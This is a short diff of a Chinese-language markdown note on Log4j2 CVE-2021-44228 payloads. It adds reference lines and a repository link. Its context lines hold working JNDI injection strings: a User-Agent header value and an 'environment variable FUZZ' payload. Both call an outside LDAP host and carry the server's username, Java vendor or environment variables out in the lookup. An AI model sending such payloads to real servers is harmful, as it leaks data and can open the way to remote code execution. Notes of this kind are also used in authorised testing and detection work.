@@ -22,6 +22,10 @@ User-Agent: ${jndi:ldap://1.1.1.1:987/${sys:user.name}/${sys:java.vendor}/x/${sy
 
 环境变量FUZZ：
 ${jndi:ldap://u${hostName}-s2u-${env:USERNAME:-${env:USER}}.x.x.x:99999/1}
+参考：
+Linux环境变量：env, Windows环境变量：windows set
+https://github.com/jas502n/Log4j2-CVE-2021-44228
+
 
 ```
 ## 注意
